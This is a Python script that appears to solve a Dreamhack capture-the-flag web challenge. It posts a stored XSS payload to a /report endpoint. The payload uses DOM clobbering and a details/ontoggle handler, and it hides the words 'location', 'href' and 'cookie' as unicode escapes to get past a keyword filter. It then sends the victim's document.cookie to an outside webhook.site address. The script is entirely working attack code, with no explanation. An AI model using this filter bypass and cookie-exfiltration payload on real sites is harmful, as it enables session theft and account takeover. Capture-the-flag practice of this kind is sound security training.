import requests

url = "http://host3.dreamhack.games:18506/"

def obf(s):
    return ''.join('\\u{:04x}'.format(ord(c)) for c in s)

js = "location.href='https://webhook.site/6785156f-3542-4773-a7c3-29ff987fdc40/'.concat(document.cookie)"

for banned in ['location', 'href', 'cookie']:
    js = js.replace(banned, obf(banned))

payload = f'''<a id="set"><a name="env" value="dev"></a><details ontoggle={js} open>'''

res = requests.post(f'{url}/report', data={
    'content': payload
})

if "success" in res.text.lower():
    print("> Payload submitted")